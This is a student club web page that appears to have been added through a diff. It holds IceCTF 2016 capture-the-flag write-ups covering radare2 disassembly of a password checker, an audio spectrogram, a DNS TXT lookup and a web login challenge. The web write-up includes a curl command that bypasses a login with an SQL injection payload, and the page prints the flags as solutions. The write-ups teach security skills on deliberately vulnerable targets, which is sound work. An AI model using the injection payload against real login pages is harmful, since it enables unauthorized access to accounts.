@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html lang="en" xmlns="http://www.w3.org/1999/html">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+    <title>Cornell Hacking Club</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link href="static/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom CSS -->
+    <link href="static/css/modern-business.css" rel="stylesheet">
+    <link href="static/css/general.css" rel="stylesheet">
+
+    <!-- Custom Fonts -->
+    <link href="static/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+</head>
+
+<body>
+
+<!-- Navigation -->
+<!-- Navigation -->
+<nav class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle" data-toggle="collapse"
+                    data-target="#bs-example-navbar-collapse-1">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="../">Cornell Hacking Club</a>
+        </div>
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+            <ul class="nav navbar-nav navbar-right">
+                <li>
+                    <a href="../about">About</a>
+                </li>
+                <!--{#                <li>#}-->
+                <!--{#                    <a href="../sponsorship">Sponsorship</a>#}-->
+                <!--{#                </li>#}-->
+                <li class="dropdown">
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown">Resources <b class="caret"></b></a>
+                    <ul class="dropdown-menu">
+                        <li>
+                            <a href="../lectures">Lectures/Workshops</a>
+                        </li>
+                        <li>
+                            <a href=../writeups>Writeups</a>
+                        </li>
+                        <li>
+                            <a href="../guides">General Guides</a>
+                        </li>
+                        <li>
+                            <a href="../tools">Tools</a>
+                        </li>
+                    </ul>
+                </li>
+                <!--{#                <li>#}-->
+                <!--{#                    <a href="../contact">Contact</a>#}-->
+                <!--{#                </li>#}-->
+                <li class="dropdown">
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown">Other Pages <b class="caret"></b></a>
+                    <ul class="dropdown-menu">
+                        <li>
+                            <a href="../faq">FAQ</a>
+                        </li>
+                    </ul>
+                </li>
+            </ul>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+
+
+<!-- Page Content -->
+<div class="container">
+
+    <!-- Page Heading/Breadcrumbs -->
+    <div class="row">
+        <div class="col-lg-12">
+            <h1 class="page-header">IceCTF
+                </small>
+            </h1>
+            <ol class="breadcrumb">
+                <li><a href="../../">Home</a>
+                </li>
+                <li><a href="../">Writeups</a></li>
+                <li class="active">IceCTF</li>
+            </ol>
+        </div>
+    </div>
+    <!-- /.row -->
+
+    <!-- Content Row -->
+    <div class="row">
+
+        <!-- Blog Post Content Column -->
+        <div class="col-lg-12">
+
+            <!-- Writeup Content Start-->
+
+                <hr>
+
+                <!-- Blog Post -->
+                <h1> A Strong Feeling [ReverseEngineering - 80 pt]</h1>
+                <hr>
+                <!-- Date/Time -->
+                <p><i class="fa fa-clock-o"></i> Posted on September 2, 2016</p>
+                <hr>
+                <p class="lead">Do you think you could defeat this password checker for us? It's making me real pissed
+                    off! /home/a_strong_feeling/ on the shell or download it here.</p>
+
+                <hr>
+
+                <p>First thing is first...download the file and open in radare2</p>
+
+<pre class="prettyprint">
+<code class="language-python">
+    hypervelocity ~ $ r2 a_strong_feeling_e899e7d22834063c8600846d0b860577785e6d1c2fcabbd61c793db3601286cc
+    -- It's not you, it's me.
+    [0x004004c0]> aaa
+    [x] Analyze all flags starting with sym. and entry0 (aa)
+    [x] Analyze len bytes of instructions for references (aar)
+    [x] Analyze function calls (aac)
+    [ ] [*] Use -AA or aaaa to perform additional experimental analysis.
+    [x] Constructing a function name for fcn.* and sym.func.* functions (aan))
+    [0x004004c0]> afl
+    0x00400450 3 26 sub.__gmon_start___160_450
+    0x00400480 2 16 -> 32 sym.imp.printf
+    0x00400490 2 16 -> 48 sym.imp.__libc_start_main
+    0x004004a0 2 16 -> 48 sym.imp.fgets
+    0x004004b0 2 16 -> 48 loc.imp.__gmon_start__
+    0x004004c0 1 42 entry0
+    0x004004f0 4 50 -> 41 fcn.004004f0
+    0x004005c0 247 6059 main
+    [0x004004c0]> pdf @ main
+    Do you want to print 1373 lines? (y/N)
+</code>
+</pre>
+
+                <p>So the main method is long, but the thing to notice is that it is very repetitive. In the beginning
+                    of main we have some instructions that seem to set up the program, and then we have repetitions of
+                    the same block of instructions but with different data. Here are two blocks of them:</p>
+
+<pre class="prettyprint">
+<code class="language-python">
+    | ||| ; JMP XREF from 0x00400663 (main)
+    | `---> 0x00400668 8b855cffffff mov eax, dword [rbp - local_a4h]
+    | || 0x0040066e 2d669be580 sub eax, 0x80e59b66
+    | || 0x00400673 898554ffffff mov dword [rbp - local_ach], eax
+    | ,===< 0x00400679 0f84a10d0000 je 0x401420
+    | ,====< 0x0040067f e9640a0000 jmp 0x4010e8
+    | |||| ; JMP XREF from 0x0040065d (main)
+    | ||`--> 0x00400684 8b855cffffff mov eax, dword [rbp - local_a4h]
+    | || | 0x0040068a 2d737a4f7c sub eax, 0x7c4f7a73
+    | || | 0x0040068f 898550ffffff mov dword [rbp - local_b0h], eax
+    | ||,==< 0x00400695 0f8f310a0000 jg 0x4010cc
+    | ,=====< 0x0040069b e900000000 jmp 0x4006a0
+    | ||||| ; JMP XREF from 0x0040069b (main)
+    | `-----> 0x004006a0 8b855cffffff mov eax, dword [rbp - local_a4h]
+    | |||| 0x004006a6 2dc88ef17b sub eax, 0x7bf18ec8
+    | |||| 0x004006ab 89854cffffff mov dword [rbp - local_b4h], eax
+    | ,=====< 0x004006b1 0f8ff9090000 jg 0x4010b0
+    | ,======< 0x004006b7 e900000000 jmp 0x4006bc
+    | |||||| ; JMP XREF from 0x004006b7 (main)
+    | `------> 0x004006bc 8b855cffffff mov eax, dword [rbp - local_a4h]
+    | ||||| 0x004006c2 2de08a2073 sub eax, 0x73208ae0
+    | ||||| 0x004006c7 898548ffffff mov dword [rbp - local_b8h], eax
+    | ,======< 0x004006cd 0f8fc1090000 jg 0x401094
+    | ,=======< 0x004006d3 e900000000 jmp 0x4006d8
+</code>
+</pre>
+
+
+                <p>This continues for a while until we get to 0x401038, which appears to be the address, which Radare
+                    indicates to us has a lot of XREFs, which tells us that throughout the program, there are a lot of
+                    jumps going to this address. Below shows blocks before and then after the address. Right after this
+                    address, the code blocks change, but it is still repetitions of the same block.</p>
+
+
+<pre class="prettyprint">
+<code class="language-python">
+    | ||||||| ; JMP XREF from 0x004006b1 (main)
+    | ||`-----> 0x004010b0 8b855cffffff mov eax, dword [rbp - local_a4h]
+    | || |||| 0x004010b6 2dc98ef17b sub eax, 0x7bf18ec9
+    | || |||| 0x004010bb 8985dcfdffff mov dword [rbp - local_224h], eax
+    | ||,=====< 0x004010c1 0f84910b0000 je 0x401c58
+    | ========< 0x004010c7 e91c000000 jmp 0x4010e8
+    | ||||||| ; JMP XREF from 0x00400695 (main)
+    | |||||`--> 0x004010cc 8b855cffffff mov eax, dword [rbp - local_a4h]
+    | ||||| | 0x004010d2 2d747a4f7c sub eax, 0x7c4f7a74
+    | ||||| | 0x004010d7 8985d8fdffff mov dword [rbp - local_228h], eax
+    | |||||,==< 0x004010dd 0f84e8080000 je 0x4019cb
+    | ========< 0x004010e3 e900000000 jmp 0x4010e8
+    | ||||||| ; XREFS: JMP 0x004010e3 JMP 0x004010c7 JMP 0x004010ab JMP 0x0040108f JMP 0x00401073 JMP 0x00401057 JMP
+    0x0040103b JMP 0x0040101f
+    | ||||||| ; XREFS: JMP 0x00401003 JMP 0x00400fe7 JMP 0x00400fcb JMP 0x00400faf JMP 0x00400f93 JMP 0x00400f77 JMP
+    0x00400f5b JMP 0x00400f3f
+    | ||||||| ; XREFS: JMP 0x00400f23 JMP 0x00400f07 JMP 0x00400eeb JMP 0x00400ecf JMP 0x00400eb3 JMP 0x00400e97 JMP
+    0x00400e7b JMP 0x00400e5f
+    | ||||||| ; XREFS: JMP 0x00400e43 JMP 0x00400e27 JMP 0x00400e0b JMP 0x00400def JMP 0x00400dd3 JMP 0x00400db7 JMP
+    0x00400d9b JMP 0x00400d7f
+    | ||||||| ; XREFS: JMP 0x00400d63 JMP 0x00400d47 JMP 0x00400d2b JMP 0x00400d0f JMP 0x00400cf3 JMP 0x00400cd7 JMP
+    0x00400cbb JMP 0x00400c9f
+    | ||||||| ; XREFS: JMP 0x00400c83 JMP 0x00400c67 JMP 0x00400c4b JMP 0x00400bf7 JMP 0x00400bbf JMP 0x00400b87 JMP
+    0x00400b4f JMP 0x0040067f
+    | ---`----> 0x004010e8 e9790c0000 jmp 0x401d66
+    | ||| ||| ; JMP XREF from 0x00400b49 (main)
+    | --------> 0x004010ed b85efbb244 mov eax, 0x44b2fb5e
+    | ||| ||| 0x004010f2 b954839742 mov ecx, 0x42978354
+    | ||| ||| 0x004010f7 8b55fc mov edx, dword [rbp - local_4h]
+    | ||| ||| 0x004010fa 81fa49000000 cmp edx, 0x49 ; 'I'
+    | ||| ||| 0x00401100 0f45c1 cmovne eax, ecx
+    | ||| ||| 0x00401103 898568ffffff mov dword [rbp - local_98h], eax
+    | |||,====< 0x00401109 e9580c0000 jmp 0x401d66
+    | ||||||| ; JMP XREF from 0x00400fe1 (main)
+    | --------> 0x0040110e 48bff41d4000. movabs rdi, 0x401df4 ; "%s"
+    | ||||||| 0x00401118 4863856cffff. movsxd rax, dword [rbp - local_94h]
+    | ||||||| 0x0040111f 488b34c5f02c. mov rsi, qword [rax*8 + 0x602cf0] ; [0x602cf0:8]=0x401e04
+    | ||||||| 0x00401127 b000 mov al, 0
+    | ||||||| 0x00401129 e852f3ffff call sym.imp.printf
+    | ||||||| 0x0040112e c745f84e0000. mov dword [rbp - local_8h], 0x4e
+    | ||||||| 0x00401135 c78568ffffff. mov dword [rbp - local_98h], 0xd14064f2
+    | ||||||| 0x0040113f 8985d4fdffff mov dword [rbp - local_22ch], eax
+    | ========< 0x00401145 e91c0c0000 jmp 0x401d66
+    | ||||||| ; JMP XREF from 0x00400ffd (main)
+    | --------> 0x0040114a b853a550f0 mov eax, 0xf050a553
+    | ||||||| 0x0040114f b9a2964c29 mov ecx, 0x294c96a2
+    | ||||||| 0x00401154 31d2 xor edx, edx
+    | ||||||| 0x00401156 8bb56cffffff mov esi, dword [rbp - local_94h]
+    | ||||||| 0x0040115c 81ea01000000 sub edx, 1
+    | ||||||| 0x00401162 89f7 mov edi, esi
+    | ||||||| 0x00401164 29d7 sub edi, edx
+    | ||||||| 0x00401166 89bd6cffffff mov dword [rbp - local_94h], edi
+    | ||||||| 0x0040116c 4c63c6 movsxd r8, esi
+    | ||||||| 0x0040116f 420fbe940570. movsx edx, byte [rbp + r8 - 0x90]
+    | ||||||| 0x00401178 81fa63000000 cmp edx, 0x63 ; 'c'
+    | ||||||| 0x0040117e 0f45c1 cmovne eax, ecx
+    | ||||||| 0x00401181 898568ffffff mov dword [rbp - local_98h], eax
+    | ========< 0x00401187 e9da0b0000 jmp 0x401d66
+    | ||||||| ; JMP XREF from 0x00400f55 (main)
+    | --------> 0x0040118c 48bff41d4000. movabs rdi, 0x401df4 ; "%s"
+    | ||||||| 0x00401196 4863856cffff. movsxd rax, dword [rbp - local_94h]
+    | ||||||| 0x0040119d 488b34c5f02c. mov rsi, qword [rax*8 + 0x602cf0] ; [0x602cf0:8]=0x401e04
+    | ||||||| 0x004011a5 b000 mov al, 0
+    | ||||||| 0x004011a7 e8d4f2ffff call sym.imp.printf
+    | ||||||| 0x004011ac c745f86f0000. mov dword [rbp - local_8h], 0x6f
+    | ||||||| 0x004011b3 c78568ffffff. mov dword [rbp - local_98h], 0xd14064f2
+    | ||||||| 0x004011bd 8985d0fdffff mov dword [rbp - local_230h], eax
+    | ========< 0x004011c3 e99e0b0000 jmp 0x401d66
+    | ||||||| ; JMP XREF from 0x00400e75 (main)
+    | --------> 0x004011c8 b875d88891 mov eax, 0x9188d875
+    | ||||||| 0x004011cd b9c07768c1 mov ecx, 0xc16877c0
+    | ||||||| 0x004011d2 31d2 xor edx, edx
+    | ||||||| 0x004011d4 8bb56cffffff mov esi, dword [rbp - local_94h]
+    | ||||||| 0x004011da 89d7 mov edi, edx
+    | ||||||| 0x004011dc 29f7 sub edi, esi
+    | ||||||| 0x004011de 4189d0 mov r8d, edx
+    | ||||||| 0x004011e1 4181e8010000. sub r8d, 1
+    | ||||||| 0x004011e8 4401c7 add edi, r8d
+    | ||||||| 0x004011eb 29fa sub edx, edi
+    | ||||||| 0x004011ed 89956cffffff mov dword [rbp - local_94h], edx
+    | ||||||| 0x004011f3 4c63ce movsxd r9, esi
+    | ||||||| 0x004011f6 420fbe940d70. movsx edx, byte [rbp + r9 - 0x90]
+    | ||||||| 0x004011ff 81fa65000000 cmp edx, 0x65 ; 'e'
+    | ||||||| 0x00401205 0f45c1 cmovne eax, ecx
+    | ||||||| 0x00401208 898568ffffff mov dword [rbp - local_98h], eax
+    | ========< 0x0040120e e9530b0000 jmp 0x401d66
+    | ||||||| ; JMP XREF from 0x00400d5d (main)
+    | --------> 0x00401213 48bff41d4000. movabs rdi, 0x401df4 ; "%s"
+    | ||||||| 0x0040121d 4863856cffff. movsxd rax, dword [rbp - local_94h]
+    | ||||||| 0x00401224 488b34c5f02c. mov rsi, qword [rax*8 + 0x602cf0] ; [0x602cf0:8]=0x401e04
+    | ||||||| 0x0040122c b000 mov al, 0
+    | ||||||| 0x0040122e e84df2ffff call sym.imp.printf
+    | ||||||| 0x00401233 c745f8740000. mov dword [rbp - local_8h], 0x74
+    | ||||||| 0x0040123a c78568ffffff. mov dword [rbp - local_98h], 0xd14064f2
+    | ||||||| 0x00401244 8985ccfdffff mov dword [rbp - local_234h], eax
+    | ========< 0x0040124a e9170b0000 jmp 0x401d66
+</code>
+</pre>
+
+                <p>In the blocks after 0x4010e8, we see, most notably, comparisons with values. The first block has a
+                    comparison cmp edx, 0x49 ; 'I', and the next one has cmp edx, 0x63 ; 'c'.
+                    </br>                    </br>
+
+                    Considering the challenge description and how the method is composed of repeating blocks of the same
+                    instructions, we know that this is probably a puzzle with following jumps and addresses. We could
+                    follow the jumps and try to solve this puzzle, or we can keep scrolling down and see that the
+                    letters being compared in the latter instructions have started to spell out "IceCTF".
+                    </br>                    </br>
+
+                    To avoid heavy scrolling, we grep for cmp:</p>
+
+<pre class="prettyprint">
+<code class="language-python">
+    [0x004005c0]> pdf @ main ~cmp
+    | ||| ||| 0x004010fa 81fa49000000 cmp edx, 0x49 ; 'I'
+    | ||||||| 0x00401178 81fa63000000 cmp edx, 0x63 ; 'c'
+    | ||||||| 0x004011ff 81fa65000000 cmp edx, 0x65 ; 'e'
+    | ||||||| 0x00401284 81fa43000000 cmp edx, 0x43 ; 'C'
+    | ||||||| 0x00401309 81fa54000000 cmp edx, 0x54 ; 'T'
+    | ||||||| 0x00401387 81fa46000000 cmp edx, 0x46 ; 'F'
+    | ||||||| 0x0040140c 81fa7b000000 cmp edx, 0x7b ; '{'
+    | ||||||| 0x00401491 81fa70000000 cmp edx, 0x70 ; 'p'
+    | ||||||| 0x0040150f 81fa69000000 cmp edx, 0x69 ; 'i'
+    | ||||||| 0x0040158d 81fa70000000 cmp edx, 0x70 ; 'p'
+    | ||||||| 0x00401612 81fa5f000000 cmp edx, 0x5f ; '_'
+    | ||||||| 0x00401697 81fa69000000 cmp edx, 0x69 ; 'i'
+    | ||||||| 0x0040171c 81fa6e000000 cmp edx, 0x6e ; 'n'
+    | ||||||| 0x004017a1 81fa73000000 cmp edx, 0x73 ; 's'
+    | ||||||| 0x00401826 81fa74000000 cmp edx, 0x74 ; 't'
+    | | ||||| 0x004018ab 81fa61000000 cmp edx, 0x61 ; 'a'
+    | ||||||| 0x00401932 81fa6c000000 cmp edx, 0x6c ; 'l'
+    | ||||||| 0x004019b7 81fa6c000000 cmp edx, 0x6c ; 'l'
+    | ||||||| 0x00401a3c 81fa5f000000 cmp edx, 0x5f ; '_'
+    | ||||||| 0x00401aba 81fa61000000 cmp edx, 0x61 ; 'a'
+    | ||||||| 0x00401b41 81fa6e000000 cmp edx, 0x6e ; 'n'
+    | ||||||| 0x00401bc6 81fa67000000 cmp edx, 0x67 ; 'g'
+    | ||||||| 0x00401c44 81fa72000000 cmp edx, 0x72 ; 'r'
+    | ||||||| 0x00401cc9 81fa7d000000 cmp edx, 0x7d ; '}'
+</code>
+</pre>
+
+                <h3><b>Flag:</b> IceCTF{pip_install_angr}</h3>
+
+
+        </div>
+
+
+        <div class="col-lg-12">
+
+            <hr>
+
+            <!-- Blog Post -->
+            <h1>Audio Problems [Forensics - 50 pt]</h1>
+
+            <hr>
+
+            <!-- Date/Time -->
+            <p><i class="fa fa-clock-o"></i> Posted on September 2, 2016 at 9:45 PM</p>
+
+            <hr>
+
+            <p class="lead">We intercepted this audio signal, it sounds like there could be something hidden in it. Can
+                you take a look and see if you can find anything?
+            </p>
+
+            <hr>
+
+            <p>First, we download the audio file and open it up using the tool Audacity. As we do, we see basic audio
+                waves. The sound, while irrelevant, is just a bit of white noise.</p>
+
+            <br/>
+
+            <img src="static/img/audio1.png" alt="First View" style="width: 100%">
+
+            <br/>
+
+            <!-- Post Content -->
+            <p>In playing around with the audio waves in Audacity, we decide to view the waves as a
+                spectrogram. The result shows us that we are very close.</p>
+            <br/>
+
+            <img src="static/img/audio2.png" alt="First View" style="width: 100%">
+            <br/>
+
+            <p>By playing around with the spectrogram settings a bit more, we eventaully arrive at something very
+                legible.</p>
+
+            <br/>
+            <img src="static/img/audio3.png" alt="First View" style="width: 100%">
+            <br/>
+
+            <h3><b>Flag:</b> IceCTF{y0U_b3t7Er_L15TeN_cL053LY}</h3>
+
+            <hr>
+
+    </div>
+
+
+    <br class="col-lg-12">
+
+        <hr>
+
+        <!-- Blog Post -->
+        <h1> Search [Misc - 40 pt]</h1>
+        <hr>
+        <!-- Date/Time -->
+        <p><i class="fa fa-clock-o"></i> Posted on September 2, 2016</p>
+        <hr>
+        <p class="lead">There's something about this domain... search.icec.tf, I don't see anything, but maybe its
+            all about the conTEXT.</p>
+
+        <hr>
+
+        <p>When visiting the website, we see that the site is entirely down. This leads us to assume the solution
+            has something to do with DNS records.</p>
+
+        </br>
+
+
+        <p>As a result, we run dig on the url with the -t flag specified to TXT to specify our query type.</p>
+
+<pre class="prettyprint">
+<code class="language-python">
+    l0g1c ~ $ dig -t txt search.icec.tf
+
+    ; <<>> DiG 9.8.3-P1 <<>> -t txt search.icec.tf
+    ;; global options: +cmd
+    ;; Got answer:
+    ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 39093
+    ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
+
+    ;; QUESTION SECTION:
+    ;search.icec.tf. IN TXT
+
+    ;; ANSWER SECTION:
+    search.icec.tf. 300 IN TXT "IceCTF{flag5_all_0v3r_the_Plac3}"
+
+    ;; Query time: 281 msec
+    ;; SERVER: 209.18.47.61#53(209.18.47.61)
+    ;; WHEN: Sat Sep 17 22:25:57 2016
+    ;; MSG SIZE rcvd: 77
+</code>
+</pre>
+
+        <h3><b>Flag:</b> IceCTF{flag5_all_0v3r_the_Plac3}</h3>
+
+        <hr>
+
+        </div>
+
+    
+        <!-- Blog Post -->
+        <h1> Flag Storage [Web - 50 pt]</h1>
+        <hr>
+        <!-- Date/Time -->
+        <p><i class="fa fa-clock-o"></i> Posted on September 2, 2016</p>
+        <hr>
+        <p class="lead">What a cheat, I was promised a flag and I can't even log in. Can you get in for me?
+            flagstorage.vuln.icec.tf. They seem to hash their passwords, but I think the problem is somehow related to
+            this. </p>
+
+        <hr>
+
+        <p>This was by far one of the most straight forward challenges. We see a website with just a simple login form.
+            We assume that attempting to login as admin is a good place to start. To do so, we use a simple SQL
+            Injection script to bypass the password verification.</p>
+
+<pre class="prettyprint">
+<code class="language-python">
+    l0g1c ~ $ curl 'http://flagstorage.vuln.icec.tf/login.php' --data
+    'username=admin%27+or+1%3D%271&password_plain=&password=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'
+</code>
+</pre>
+
+<pre class="prettyprint">
+<code class="lang-html">
+    <h1> Logged in!</h1><p>   Your flag is: IceCTF{why_would_you_even_do_anything_client_side}</p>
+</code>
+</pre>
+
+    <h3><b>Flag:</b> IceCTF{why_would_you_even_do_anything_client_side}</h3>
+
+        <hr>
+
+    </div>
+</div>
+
+
+    <!-- Writeup Content End-->
+
+
+    <!-- Footer -->
+    <footer>
+        <div class="row">
+            <div class="col-lg-12">
+                <p>Copyright &copy; Cornell Hacking Club 2016</p>
+            </div>
+        </div>
+    </footer>
+
+</div>
+<!-- /.container -->
+
+<!-- jQuery -->
+<script src="static/js/jquery.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="static/js/bootstrap.min.js"></script>
+
+<!-- Code Snippet Prettify -->
+<script src="https://cdn.rawgit.com/google/code-prettify/master/loader/run_prettify.js"></script>
+
+</body>
+
+</html>
